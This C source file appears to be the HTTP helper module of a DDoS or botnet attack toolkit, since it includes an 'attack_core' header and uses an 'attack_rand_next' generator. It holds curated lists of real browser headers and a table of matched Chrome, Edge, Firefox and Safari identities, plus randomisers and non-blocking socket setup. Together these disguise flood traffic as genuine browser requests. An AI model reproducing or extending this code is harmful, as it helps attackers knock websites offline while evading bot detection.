#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "http_common.h"
#include "../headers/attack_core.h"

const char* const HTTP_USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
};
const size_t HTTP_NUM_USER_AGENTS = sizeof(HTTP_USER_AGENTS) / sizeof(HTTP_USER_AGENTS[0]);

const char* const HTTP_ACCEPT_HEADERS[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*"
};
const size_t HTTP_NUM_ACCEPT_HEADERS = sizeof(HTTP_ACCEPT_HEADERS) / sizeof(HTTP_ACCEPT_HEADERS[0]);

const char* const HTTP_ACCEPT_LANGUAGES[] = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "en-US,en;q=0.5",
    "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7"
};
const size_t HTTP_NUM_ACCEPT_LANGUAGES = sizeof(HTTP_ACCEPT_LANGUAGES) / sizeof(HTTP_ACCEPT_LANGUAGES[0]);

const char* const HTTP_SEC_CH_UA[] = {
    "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
    "\"Google Chrome\";v=\"133\", \"Not(A:Brand\";v=\"99\", \"Chromium\";v=\"133\"",
    "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
    "\"Chromium\";v=\"131\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"131\"",
    "\"Google Chrome\";v=\"134\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"134\"",
    "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"133\", \"Chromium\";v=\"133\"",
};
const size_t HTTP_NUM_SEC_CH_UA = sizeof(HTTP_SEC_CH_UA) / sizeof(HTTP_SEC_CH_UA[0]);

/*
 * Correlated browser identities: UA + sec-ch-ua + platform are always consistent.
 * Firefox/Safari do NOT send sec-ch-ua headers -> sec_ch_ua = NULL.
 */
static const browser_identity_t BROWSER_IDENTITIES[] = {
    /* Chrome 134 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"", "\"Windows\"" },
    /* Chrome 134 - macOS */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"", "\"macOS\"" },
    /* Chrome 134 - Linux */
    { "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"", "\"Linux\"" },
    /* Chrome 133 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
      "\"Google Chrome\";v=\"133\", \"Not(A:Brand\";v=\"99\", \"Chromium\";v=\"133\"", "\"Windows\"" },
    /* Chrome 133 - macOS */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
      "\"Google Chrome\";v=\"133\", \"Not(A:Brand\";v=\"99\", \"Chromium\";v=\"133\"", "\"macOS\"" },
    /* Chrome 132 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
      "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"", "\"Windows\"" },
    /* Chrome 132 - macOS */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
      "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"", "\"macOS\"" },
    /* Chrome 131 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"131\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"131\"", "\"Windows\"" },
    /* Chrome 131 - Linux */
    { "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"131\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"131\"", "\"Linux\"" },
    /* Chrome 130 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"", "\"Windows\"" },
    /* Chrome 130 - macOS */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"", "\"macOS\"" },
    /* Chrome 129 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
      "\"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"", "\"Windows\"" },
    /* Edge 134 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
      "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Microsoft Edge\";v=\"134\"", "\"Windows\"" },
    /* Edge 133 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
      "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\", \"Microsoft Edge\";v=\"133\"", "\"Windows\"" },
    /* Edge 134 - macOS */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
      "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Microsoft Edge\";v=\"134\"", "\"macOS\"" },
    /* Firefox 135 - Windows (no sec-ch-ua) */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
      NULL, NULL },
    /* Firefox 134 - Windows (no sec-ch-ua) */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
      NULL, NULL },
    /* Firefox 135 - macOS (no sec-ch-ua) */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
      NULL, NULL },
    /* Firefox 135 - Linux (no sec-ch-ua) */
    { "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
      NULL, NULL },
    /* Firefox 133 - Windows (no sec-ch-ua) */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
      NULL, NULL },
    /* Safari 18.3 - macOS (no sec-ch-ua) */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
      NULL, NULL },
    /* Safari 18.2 - macOS (no sec-ch-ua) */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
      NULL, NULL },
    /* Safari 18.3 - iPhone (no sec-ch-ua) */
    { "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
      NULL, NULL },
    /* Chrome 134 - Android Mobile */
    { "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
      "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"", "\"Android\"" },
    /* Chrome 133 - Android Mobile */
    { "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
      "\"Google Chrome\";v=\"133\", \"Not(A:Brand\";v=\"99\", \"Chromium\";v=\"133\"", "\"Android\"" },
    /* Chrome 128 - Windows */
    { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"", "\"Windows\"" },
    /* Chrome 128 - macOS */
    { "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
      "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"", "\"macOS\"" },
};
static const size_t NUM_BROWSER_IDENTITIES = sizeof(BROWSER_IDENTITIES) / sizeof(BROWSER_IDENTITIES[0]);

const char* http_get_random_user_agent(void) {
    return HTTP_USER_AGENTS[attack_rand_next() % HTTP_NUM_USER_AGENTS];
}

const browser_identity_t* http_get_random_identity(void) {
    return &BROWSER_IDENTITIES[attack_rand_next() % NUM_BROWSER_IDENTITIES];
}

void http_generate_random_string(char* buf, int len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < len; i++) {
        buf[i] = charset[attack_rand_next() % (sizeof(charset) - 1)];
    }
    buf[len] = '\0';
}

void http_set_nonblocking(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) {
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    }
}

int http_is_ip_address(const char *host) {
    struct in_addr tmp;
    return (host && inet_pton(AF_INET, host, &tmp) == 1) ? 1 : 0;
}
